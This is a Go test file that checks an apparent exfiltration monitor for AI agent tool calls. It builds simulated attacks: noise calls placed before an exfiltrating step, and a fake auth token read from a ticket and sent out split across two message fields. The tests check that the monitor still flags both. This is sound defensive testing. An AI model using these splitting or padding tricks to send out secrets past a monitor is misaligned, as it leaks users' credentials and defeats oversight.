// SPDX-License-Identifier: Apache-2.0

package corpus

import (
	"math/rand"
	"strconv"
	"testing"
)

// Metamorphic relations (ROADMAP §81). Each states something that must stay
// true however the inputs are rearranged, so they find bugs the fixed
// scenarios cannot.

// Adding unrelated calls before the exfiltrating step never removes a catch.
func TestProperty_NoiseNeverRemovesACatch(t *testing.T) {
	r := rand.New(rand.NewSource(1))
	var base []Scenario
	for _, sc := range MaliciousScenarios() {
		if !sc.KnownGap && sc.Variant != VariantSensorB {
			base = append(base, sc)
		}
	}
	if len(base) < 20 {
		t.Fatalf("only %d base scenarios", len(base))
	}
	for _, sc := range base {
		last := len(sc.Steps) - 1
		session := ""
		for _, s := range sc.Steps {
			if s.Event.SessionID != "" {
				session = s.Event.SessionID
				break
			}
		}
		if session == "" {
			session = sc.Steps[0].Syscall.SessionID
		}
		noisy := sc
		noisy.ID = sc.ID + "+noise"
		noisy.Steps = append([]Step{}, sc.Steps[:last]...)
		for k := 1 + r.Intn(8); k > 0; k-- { // stays under decay_after_calls (32)
			noisy.Steps = append(noisy.Steps, noiseStep(r, session))
		}
		noisy.Steps = append(noisy.Steps, sc.Steps[last])
		if res := Run([]Scenario{noisy})[0]; !res.TrippedExfil {
			t.Errorf("%s: EXFIL lost after inserting %d unrelated calls (verdicts=%v)", sc.ID, len(noisy.Steps)-len(sc.Steps), res.Verdicts)
		}
	}
}

// Splitting the secret across two fields of one call, at any boundary, is caught.
func TestProperty_SplitAtEveryBoundaryIsCaught(t *testing.T) {
	const secret = "sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"
	var missed []int
	for i := 1; i < len(secret); i++ {
		id := "prop_split_" + strconv.Itoa(i)
		s := sid(id)
		sc := Scenario{ID: id, Category: Malicious, Variant: VariantProxyA, Steps: []Step{
			resultStep(s, "read_ticket", "tickets", nextSeq(), resultJSON("Customer auth token: "+secret)),
			requestStep(s, "send_message", "messenger", nextSeq(), argsJSON(map[string]string{"part1": secret[:i], "part2": secret[i:], "to": "x@y.example"})),
		}}
		if !Run([]Scenario{sc})[0].TrippedExfil {
			missed = append(missed, i)
		}
	}
	if len(missed) > 0 {
		t.Errorf("secret of %d bytes escaped when split at offsets %v", len(secret), missed)
	}
}
